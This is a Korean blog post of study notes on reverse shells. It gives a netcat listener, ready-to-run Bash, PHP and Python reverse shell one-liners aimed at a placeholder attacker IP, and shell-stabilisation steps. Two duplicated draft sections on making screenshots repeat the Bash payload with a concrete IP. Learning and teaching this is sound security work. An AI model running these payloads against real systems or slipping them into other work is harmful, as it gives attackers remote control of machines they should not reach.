---
layout: post
title: "리버스 쉘 (Reverse Shell) 공부"
date: 2025-09-20 17:00:00 +0900
categories: [시스템 해킹]
---

### 1. 개요

리버스 쉘(Reverse Shell)은 공격 대상 서버가 공격자 PC로 직접 쉘을 연결하도록 만드는 공격 기법이다. 방화벽이 외부에서 내부로 들어오는 연결은 차단하지만 내부에서 외부로 나가는 연결은 허용하는 경우가 많다는 점을 이용한다.

---

### 2. 1단계: 리스너 설정

가장 먼저 공격자 PC에서 대상 서버로부터의 연결을 받을 준비를 해야 한다. `netcat`을 이용해 특정 포트를 열고 연결을 기다리는 리스너를 실행한다.
```bash
# 4444번 포트에서 연결을 대기하며 상세 정보를 출력
nc -lvnp 4444
```
*   `-l`: 리스닝 모드
*   `-v`: 상세 정보 출력
*   `-n`: DNS 조회 생략
*   `-p`: 포트 지정

---

### 3. 2단계: 페이로드 실행

대상 서버의 환경에 맞는 페이로드를 실행하여 공격자 PC로 연결을 시도한다. `revshells.com`과 같은 도구를 사용하면 원하는 환경의 페이로드를 쉽게 생성할 수 있다.

*   **Bash:** `bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1`
*   **PHP:** `php -r '$sock=fsockopen("[Attacker IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
*   **Python:** `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[Attacker IP]",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`

---

### 4. 3단계: 쉘 안정화 (Stabilization)

처음 획득한 쉘은 자동 완성이나 `Ctrl+C`가 동작하지 않는 불안정한 쉘(Dumb Shell)이다. 이를 상호작용이 가능한 완전한 TTY 쉘로 업그레이드하는 과정이 필요하다.

[여기에 쉘 안정화 전/후 비교 이미지 삽입]

1.  **TTY 쉘 생성:**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
2.  **터미널 제어권 확보:**
    ```bash
    # (Ctrl+Z 입력) -> 쉘을 백그라운드로 보냄
    stty raw -echo; fg
    # (Enter 두 번 입력) -> 다시 포어그라운드로 가져옴
    ```
3.  **환경 변수 설정:**
    ```bash
    export TERM=xterm
    export SHELL=bash
    ```

<hr class="short-rule">





### 시각 자료(이미지) 제작을 위한 스크립트

#### **쉘 안정화 전/후 비교 이미지 제작**

이 이미지는 제한된 쉘과 완전한 TTY 쉘의 기능적 차이를 명확하게 보여줍니다.

**1. "Before" 이미지 (제한된 쉘)**

1.  공격자 PC에서 `nc -lvnp 4444`로 리스너를 실행하고 대상 서버에서 리버스 쉘 페이로드를 실행하여 쉘을 획득합니다.
2.  획득한 쉘에서 `Tab` 키를 누르거나 `Ctrl+C`를 눌렀을 때 쉘 전체가 종료되어 버리는 현상을 보여줍니다. (예: `^C` 문자가 찍히고 쉘 연결이 끊김)
3.  이 불안정한 상태의 터미널 화면을 스크린샷으로 찍어 **`쉘안정화_전.png`** 로 저장합니다.

**2. "After" 이미지 (안정화된 쉘)**

1.  다시 쉘을 획득한 후, 위 `3. 쉘 안정화` 섹션의 1, 2, 3단계 명령어를 순서대로 모두 실행합니다.
2.  안정화된 쉘에서 `clear` 명령어가 정상적으로 동작하여 화면이 깨끗해지는 것을 보여줍니다.
3.  `ls -l /etc/ap` 까지 입력한 뒤 `Tab` 키를 눌러 `apache2/`로 자동 완성되는 모습을 보여줍니다.
4.  이 모든 기능이 정상적으로 동작하는 터미널 화면을 스크린샷으로 찍어 **`쉘안정화_후.png`** 로 저장합니다.

**3. 최종 이미지 편집**

1.  이미지 편집 프로그램에서 `쉘안정화_전.png`(왼쪽)와 `쉘안정화_후.png`(오른쪽)를 나란히 배치합니다.
2.  각 이미지 위에 "**Before (Dumb Shell)**"과 "**After (Fully Interactive TTY Shell)**" 텍스트를 추가합니다.
3.  **Before** 이미지에서는 `Ctrl+C`로 인해 쉘이 종료되는 부분에 하이라이트를 적용합니다.
4.  **After** 이미지에서는 탭 자동 완성이 성공하거나 `clear` 명령이 실행되는 부분에 하이라이트를 적용하여, 쉘이 완전히 제어 가능해졌음을 시각적으로 강조합니다.
5.  수정된 이미지를 저장하여 게시글에 삽입합니다.

### 시각 자료(이미지) 제작을 위한 스크립트

#### **쉘 업그레이드 전/후 비교 이미지 제작**

이 이미지는 제한된 쉘과 완전한 TTY 쉘의 차이점을 명확하게 보여주는 핵심 자료입니다.

**1. "Before" 이미지 (제한된 쉘)**

1.  (준비) 두 개의 터미널 창을 엽니다. 하나는 **공격자 PC(Attacker)** 다른 하나는 **대상 서버(Target)** 역할입니다.
2.  **공격자 PC** 터미널에서 리버스 쉘 리스너를 실행합니다.
    ```bash
    nc -lvnp 4444
    ```
3.  **대상 서버** 터미널에서 공격자 PC로 리버스 쉘을 연결하는 명령어를 실행합니다.
    ```bash
    bash -i >& /dev/tcp/192.9.200.12/4444 0>&1
    ```
4.  **공격자 PC** 터미널에 연결이 수립되고, `$` 와 같이 매우 단순한 프롬프트가 나타날 것입니다. 이 상태에서 `whoami` 같은 간단한 명령어를 한두 번 실행합니다.
5.  이 단순한 프롬프트가 보이는 **공격자 PC** 터미널 화면을 스크린샷으로 찍어 **`쉘업그레이드_전.png`** 로 저장합니다.

**2. "After" 이미지 (TTY 쉘)**

1.  위 4번 상태의 **공격자 PC** 터미널(리버스 쉘이 연결된 상태)에서, 쉘 업그레이드 명령어를 입력합니다.
    ```bash
    python3 -c "import pty; pty.spawn('/bin/bash')"
    ```
2.  명령어 실행 직후 프롬프트가 `www-data@ubuntu:/var/www/html$` 와 같이 사용자명과 현재 경로가 포함된 완전한 형태로 변경될 것입니다.
3.  변경된 프롬프트가 보이는 **공격자 PC** 터미널 화면을 스크린샷으로 찍어 **`쉘업그레이드_후.png`** 로 저장합니다.

**3. 최종 이미지 편집**

1.  이미지 편집 프로그램(포토샵, 그림판 등)에서 새 캔버스를 엽니다.
2.  왼쪽에 `쉘업그레이드_전.png`를, 오른쪽에 `쉘업그레이드_후.png`를 나란히 배치합니다.
3.  각 이미지 위에 "**Before (Dumb Shell)**"과 "**After (Interactive TTY Shell)**" 텍스트를 추가합니다.
4.  **Before** 이미지에서는 단순한 `$` 프롬프트 부분에 하이라이트를 적용합니다.
5.  **After** 이미지에서는 `python3 -c "..."` 명령어 전체와, 그 결과로 나타난 `www-data@ubuntu:...$` 프롬프트 부분에 하이라이트를 적용하여 원인과 결과를 명확히 보여줍니다.
6.  수정된 이미지를 저장하여 게시글에 삽입합니다.